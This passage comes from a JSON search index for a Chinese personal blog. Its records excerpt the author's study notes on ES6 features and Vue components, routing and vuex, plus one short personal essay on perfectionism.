教程》笔记"],"lvl2":"摘要","objectID":"3feb1854e89d77370601791b95ea34da","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/30.%E8%A3%85%E9%A5%B0%E5%99%A8/"},{"content":"ArrayBuffer ArrayBuffer对象、TypedArray视图和DataView视图是 JavaScript 操作二进制数据的一个接口。这些对象早就存在，属于独立的规格（","lvl0":"ArrayBuffer","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3cb3023010e37c8458c5afe59665fdd3","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/28.arraybuffer/"},{"content":"async 函数 含义 ES2017 标准引入了 async 函数，使得异步操作变得更加方便。 async 函数是什么？一句话，它就是 Generator 函数的语法糖。 前文有一个 Generator 函数，依次读取两个文件。 1 2","lvl0":"async 函数","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"349dca2fed34da6130dbd934901c2bc9","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/20.async-%E5%87%BD%E6%95%B0/"},{"content":"Class 的基本语法 简介 类的由来 JavaScript 语言中，生成实例对象的传统方法是通过构造函数。下面是一个例子。 1 2 3 4 5 6 7 8 9 10 function Point(x, y) { this.x = x; this.y = y; } Point.prototype.toString = function () {","lvl0":"Class 的基本语法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3dbc026f2ef2787e98341af59d39f507","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/21.class-%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"content":"Class 的继承 简介 Class 可以通过extends关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。 1 2 3 4 5 class Point { } class ColorPoint extends Point { } 上面代码","lvl0":"Class 的继承","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"eb753521026d2825340f3df0aa290129","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/22.class-%E7%9A%84%E7%BB%A7%E6%89%BF/"},{"content":"Generator 函数的异步应用 异步编程对 JavaScript 语言太重要。JavaScript 语言的执行环境是“单线程”的，如果没有异步编程，根本没法用，非卡死不可。本章主要","lvl0":"Generator 函数的异步应用","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"2bbcea327d1a9f81848ef320215d2afb","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/19.generator-%E5%87%BD%E6%95%B0%E7%9A%84%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/"},{"content":"Generator 函数的语法 简介 基本概念 Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同。本章详细介绍 Generator 函数的语法和 API，它的异步编程应用","lvl0":"Generator 函数的语法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"368409b70c69b6ef75f15dc97fe7e67b","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/18.generator-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%AD%E6%B3%95/"},{"content":"Iterator 和 for\u0026hellip;of 循环 Iterator（遍历器）的概念 JavaScript 原有的表示“集合”的数据结构，主要是数组（Array）和对象（Object），ES6 又添加了Ma","lvl0":"Iterator 和 for-of 循环","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"390113fe085426f7be779090005cb19c","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/17.iterator-%E5%92%8C-for-of-%E5%BE%AA%E7%8E%AF/"},{"content":"let 和 const 命令 let 命令 基本用法 ES6 新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效(块级作用","lvl0":"let 和 const 命令","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"10c5e971fce41d196e3f4b5c2774be34","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/02.let-%E5%92%8C-const-%E5%91%BD%E4%BB%A4/"},{"content":"Module 的加载实现 上一章介绍了模块的语法，本章介绍如何在浏览器和 Node.js 之中加载 ES6 模块，以及实际开发中经常遇到的一些问题（比如循环加载）。 浏览器加载 传统","lvl0":"Module 的加载实现","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"e9a5c088f1297deec5ba5417f1b41c64","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/24.module-%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/"},{"content":"Module 的语法 概述 历史上，JavaScript 一直没有模块（module）体系，无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。其","lvl0":"Module 的语法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"81eff336793b91b930ecab79e8c438f8","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/23.module-%E7%9A%84%E8%AF%AD%E6%B3%95/"},{"content":"Promise 对象 Promise 的含义 Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言","lvl0":"Promise 对象","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"4778fdf8f2839ff752faa5f1414116a9","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/16.promise-%E5%AF%B9%E8%B1%A1/"},{"content":"Proxy 概述 Proxy 用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”（meta programming），即对编程语言进行编程","lvl0":"Proxy","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"1b4fc473da70e358006224ad3144e59a","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/14.proxy/"},{"content":"Reflect 概述 Reflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API。Reflect对象的设计目的有这样几个。 （1） **将Obj","lvl0":"Reflect","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"5ec69ed93b82b9f0c298d741710290ce","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/15.reflect/"},{"content":"Set 和 Map 数据结构 Set 基本用法 ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 Set本身是一个构造函数，用来生成 Set","lvl0":"Set 和 Map 数据结构","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"92b26a0bdee2891a5daa78dd17675e8d","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/13.set-%E5%92%8C-map-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"Symbol 概述 ES5 的对象属性名都是字符串，这容易造成属性名的冲突。比如，你使用了一个他人提供的对象，但又想为这个对象添加新的方法（mixin 模式），新","lvl0":"Symbol","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"0f2a4e5a0499539f2dbe938af7041062","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/12.symbol/"},{"content":"函数的扩展 函数参数的默认值 基本用法 ES6 之前，不能直接为函数的参数指定默认值，只能采用变通的方法。 1 2 3 4 5 6 7 8 function log(x, y) { y = y || \u0026#39;World\u0026#39;; console.log(x, y); } log(\u0026#39;Hello\u0026#39;) // Hello","lvl0":"函数的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"da7be89b2d409278ceed08a0b1d6b7e3","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/08.%E5%87%BD%E6%95%B0%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"变量的解构赋值 数组的解构赋值 基本用法 ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。 以","lvl0":"变量的解构赋值","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"78250d35d7c09504c901106a74565761","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/03.%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/"},{"content":"字符串的扩展 本章介绍 ES6 对字符串的改造和增强，下一章介绍字符串对象的新增方法。 字符的 Unicode 表示法 ES6 加强了对 Unicode 的支持，允许采用\\uxxxx形式表示一","lvl0":"字符串的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"78278c5664fd28591345b1a0bfe3736e","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/04.%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"字符串的新增方法 本章介绍字符串对象的新增方法。 String.fromCodePoint() ES5 提供String.fromCharCode()方法，用于从 Unicode 码点返回对应字符，但是这个方法","lvl0":"字符串的新增方法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"fc3d5f7f57752f2bfc29fc7cf6e0c607","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/05.%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/"},{"content":"对象的扩展 对象（object）是 JavaScript 最重要的数据结构。ES6 对它进行了重大升级，本章介绍数据结构本身的改变，下一章介绍Object对象的新增方","lvl0":"对象的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"908aae965b8a69b6f6d990c8026894b5","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/10.%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"对象的新增方法 本章介绍 Object 对象的新增方法。 Object.is() ES5 比较两个值是否相等，只有两个运算符：相等运算符（==）和严格相等运算符（===）。它们都有缺点，","lvl0":"对象的新增方法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"48abfb103a908810b419249c6be4f8a6","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/11.%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/"},{"content":"异步遍历器 同步遍历器的问题 《遍历器》一章说过，Iterator 接口是一种数据遍历的协议，只要调用遍历器对象的next方法，就会得到一个对象，","lvl0":"异步遍历器","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"8237d4cc839bc6ea80e9b5b2f3e6b1d2","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/27.%E5%BC%82%E6%AD%A5%E9%81%8D%E5%8E%86%E5%99%A8/"},{"content":"数值的扩展 二进制和八进制表示法 ES6 提供了二进制和八进制数值的新的写法，分别用前缀0b（或0B）和0o（或0O）表示。 1 2 0b111110111 === 503 // true 0o767 === 503 // true 从","lvl0":"数值的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"c03ec68c3da40a616c451d069365997d","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/07.%E6%95%B0%E5%80%BC%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"数组的扩展 扩展运算符 含义 扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。 1 2 3 4 5 6","lvl0":"数组的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"59f97d0456595debb8366a7931849dfb","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/09.%E6%95%B0%E7%BB%84%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"正则的扩展 RegExp 构造函数 在 ES5 中，RegExp构造函数的参数有两种情况。 第一种情况是，参数是字符串，这时第二个参数表示正则表达式的修饰符（flag","lvl0":"正则的扩展","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"c45147fa93ab58b244ec9f379ffc94e8","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/06.%E6%AD%A3%E5%88%99%E7%9A%84%E6%89%A9%E5%B1%95/"},{"content":"编程风格 本章探讨如何将 ES6 的新语法，运用到编码实践之中，与传统的 JavaScript 语法结合在一起，写出合理的、易于阅读和维护的代码。 多家公司和组织已经公开了它","lvl0":"编程风格","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"8782b18f27bfecd3f34dc484f4efacc5","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/25.%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/"},{"content":"读懂 ECMAScript 规格 概述 规格文件是计算机语言的官方标准，详细描述语法规则和实现方法。 一般来说，没有必要阅读规格，除非你要写编译器。因为规格写得非常抽象","lvl0":"读懂 ECMAScript 规格","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"b0cbcd0162dc9488aee05d2a5e479272","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/26.%E8%AF%BB%E6%87%82-ecmascript-%E8%A7%84%E6%A0%BC/"},{"content":"JS随机打乱数组 1 2 3 4 5 6 7 8 9 10 11 12 13 function shuffle(arr) { // 随机打乱数组 let _arr = arr.slice() // 调用数组副本，不改变原数组 for (let i = 0; i \u0026lt; _arr.length; i++) { let j = getRandomInt(0, i) let t = _arr[i] _arr[i] =","lvl0":"JS随机打乱数组","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"0654c18f65347007faa8b61f12d8d95f","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/50.js%E9%9A%8F%E6%9C%BA%E6%89%93%E4%B9%B1%E6%95%B0%E7%BB%84/"},{"content":"列表渲染之数组、对象更新检测 数组更新检测API 对象更新检测API 数组更新检测 变异方法 (mutation method) Vue 将被侦听的数组的变异方法进行了包裹，所以它们也将会","lvl0":"列表渲染之数组、对象更新检测","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"a38b152075bd0de11192d709db1ebd0e","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/35.%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E4%B9%8B%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B/"},{"content":"v-if vs v-show API v-if 根据渲染条件决定是否把元素渲染到DOM页面，而v-show不管渲染条件是什么，都会把元素渲染到DOM页面，只是简单的切换CSS的显","lvl0":"v-if vs v-show","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"0e38816214214a20abb5d7332317c026","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/30.v-if-vs-v-show/"},{"content":"计算属性 vs 方法 vs 侦听属性 API 如果一个功能同时可以使用计算属性(computed)、方法(methods)、侦听属性(watch)来实现的时候推","lvl0":"计算属性 vs 方法 vs 侦听属性","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"6eb43bce9e726737a02f22bd71fe8ece","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/20.%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7-vs-%E6%96%B9%E6%B3%95-vs-%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7/"},{"content":"实例生命周期钩子 实例生命周期钩子API 简单理解，生命周期钩子函数就是vue实例在某一个时间点会自动执行的函数。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15","lvl0":"生命周期","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"bc4633839ed1ed7e2d896adb9f17530b","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/10.%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"content":"路由懒加载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 路由同步加载 // import Recommend from \u0026#39;@/components/recommend/recommend\u0026#39; // import Singer from \u0026#39;@/components/singer/singer\u0026#39; // import Rank from \u0026#39;@/components/rank/rank\u0026#39; // import Search from \u0026#39;@/components/search/search\u0026#39; // import SingerDetail from \u0026#39;@/components/singer-detail/singer-detail\u0026#39; // import Disc from \u0026#39;@/components/disc/disc\u0026#39; // import TopList from \u0026#39;@/components/top-list/top-list\u0026#39; //","lvl0":"路由懒加载","lvl1":["《Vue》笔记","规模化"],"lvl2":"摘要","objectID":"634024cd75f891662cecf8896ee253d4","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/06.%E8%A7%84%E6%A8%A1%E5%8C%96/140.%E8%B7%AF%E7%94%B1%E6%87%92%E5%8A%A0%E8%BD%BD/"},{"content":"transition-group列表过渡 列表的进入/离开过渡 1 2 3 \u0026lt;transition-group tag=\u0026#34;ul\u0026#34;\u0026gt; \u0026lt;!--tag转为ul--\u0026gt; \u0026lt;li v-for=\u0026#34;item in list\u0026#34; :key=\u0026#34;item\u0026#34;\u0026gt;{{item}}\u0026lt;/li\u0026gt; \u0026lt;!--子元素","lvl0":"transition-group列表过渡","lvl1":["《Vue》笔记","过渡\u0026动画"],"lvl2":"摘要","objectID":"8589dbdd6f06d82e8b1716682b9c1b27","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/03.%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/120.transition-group%E5%88%97%E8%A1%A8%E8%BF%87%E6%B8%A1/"},{"content":"transition过渡\u0026amp;动画 API 使用 需要设置动画的元素或组件要在外边包裹一个\u0026lt;transition\u0026gt;标签，设置自定义的n","lvl0":"transition过渡\u0026动画","lvl1":["《Vue》笔记","过渡\u0026动画"],"lvl2":"摘要","objectID":"9d0f5c9e4554707e09aa68795b4d3967","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/03.%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/110.transition%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/"},{"content":"vuex操作相关 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import { mapActions, mapMutations, mapGetters } from \u0026#39;vuex\u0026#39; computed: { ...mapGetters([ // 获取数据，内部为数组 \u0026#39;searchHistory\u0026#39; // 相当于在data插入sear","lvl0":"vuex操作相关","lvl1":["《Vue》笔记","规模化"],"lvl2":"摘要","objectID":"6ca7ae1cf14d28339e0b9806279eaa12","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/06.%E8%A7%84%E6%A8%A1%E5%8C%96/100.vuex%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3/"},{"content":"操作本地缓存 https://github.com/ustbhuangyi/storage 操作 sessionStorage 和 localStorage 。","lvl0":"操作本地缓存","lvl1":["《Vue》笔记","其他"],"lvl2":"摘要","objectID":"e620854642bace21ec4e6db98ab4b30a","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/99.%E5%85%B6%E4%BB%96/90.%E6%93%8D%E4%BD%9C%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98/"},{"content":"Vue中的防抖函数封装和使用 如搜索框中，每改变一个数值就请求一次搜索接口，当快速的改变数值时并不需要多次请求接口，这就需要一个防抖函数： 1 2","lvl0":"Vue中的防抖函数封装和使用","lvl1":["《Vue》笔记","其他"],"lvl2":"摘要","objectID":"a80ae1721d912c4e05d5cd4f7c34fdb2","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/99.%E5%85%B6%E4%BB%96/80.vue%E4%B8%AD%E7%9A%84%E9%98%B2%E6%8A%96%E5%87%BD%E6%95%B0%E5%B0%81%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"content":"父组件调用子组件方法并传入值 通过ref引用调用子组件内的方法并传入参数 父组件： 1 2 3 4 5 6 7 \u0026lt;子组件标签 ref=\u0026#34;refNam","lvl0":"父组件调用子组件方法并传入值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"89a9294685a6435fa34dbb197491a90c","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/70.%E7%88%B6%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E5%AD%90%E7%BB%84%E4%BB%B6%E6%96%B9%E6%B3%95%E5%B9%B6%E4%BC%A0%E5%85%A5%E5%80%BC/"},{"content":"兄弟组件传值 子组件1中把值传到父组件,父组件获取值传入子组件2 父组件： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;子组件1 @方法名x=\u0026#34;方","lvl0":"兄弟组件传值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"c08dd202a3b694329d92160527caecc9","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/60.%E5%85%84%E5%BC%9F%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":"子组件派发事件和值给父组件 API 子组件通过$emit派发事件和值给父组件（值可以有多个） 1 this.$emit(\u0026#39;fnX\u0026#39;, value) 父组件通过v-on绑定子组件派发的事件，并触发一个","lvl0":"子组件派发事件和值给父组件","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"85c3630697a47f5810d03026c6578dd5","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/50.%E5%AD%90%E7%BB%84%E4%BB%B6%E6%B4%BE%E5%8F%91%E4%BA%8B%E4%BB%B6%E5%92%8C%E5%80%BC%E7%BB%99%E7%88%B6%E7%BB%84%E4%BB%B6/"},{"content":"父组件给子组件传值 父组件中，通过给子组件标签v-bind绑定属性的方式传入值 1 \u0026lt;ComponentName v-bind:name=\u0026#34;value\u0026#34;\u0026gt;\u0026lt;/ComponentName\u0026gt; 如果不使用v-bind传入的值为字符串，使用v-bind绑","lvl0":"父组件给子组件传值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"2c9ebbf8582982115e814f2bde06b2af","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/40.%E7%88%B6%E7%BB%84%E4%BB%B6%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":":::tip 说明：本章内容是博主的Vue学习笔记，以官方文档为准。 ::: MVVM模式 MVVM模式，M即 model，数据模型；V即 view，视图；VM即 vi","lvl0":"MVVM模式","lvl1":["《Vue》笔记","基础"],"lvl2":"摘要","objectID":"44dc02ca5c5d1065b9983b790a4a231b","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/00.mvvm%E6%A8%A1%E5%BC%8F/"},{"content":"","lvl0":"《Vue》笔记","lvl1":null,"lvl2":"摘要","objectID":"b4b58ed2ceba4bb4c2ad82135f16b857","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.vue%E7%AC%94%E8%AE%B0/"},{"content":"一个完美主义者的自我救赎 最近，看到一个心理测试题是测试你是否有完美主义： （1）你是不是经常为自己设定目标，而且最终往往达不到那些目标？ （2）","lvl0":"一个完美主义者的自我救赎","lvl1":["更多","心情杂货"],"lvl2":"摘要","objectID":"a826273649540875cf314ac016b0212d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/05.%E5%BF%83%E6%83%85%E6%9D%82%E8%B4%A7/01.%E4%B8%80%E4%B8%AA%E5%AE%8C%E7%BE%8E%E4%B8%BB%E4%B9%89%E8%80%85%E7%9A%84%E8%87%AA%E6%88%91%E6%95%91%E8%B5%8E/"},{"content":"","lvl0":"《ES6 教程》笔记","lvl1":null,"lvl2":"摘要","objectID":"9cdca8974e52be240d8c1248b280aff6","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"content":"说明：本章内容为博主在原教程基础上添加自己的学习笔记，来源http://es6.ruanyifeng.com/，教程版权归原作者所有。 ECMAScript 6 简","lvl0":"ECMAScript 6 简介","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"9ac33b6166edd6f3a6b92c119e3a5655","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/01.ecmascript-6-%E7%AE%80%E4%BB%8B/"},{"content":"","lvl0":"《JavaScript教程》笔记","lvl1":null,"lvl2":"摘要","objectID":"02c44b2169681c0a55c238910d16beb6","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/00.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"content":"DOM 一、概述 1、DOM DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用","lvl0":"DOM","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"47c3b3d06c1a81b924ab0975ec17493e","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/05.dom/"},{"content":"事件 一、EventTarget 接口 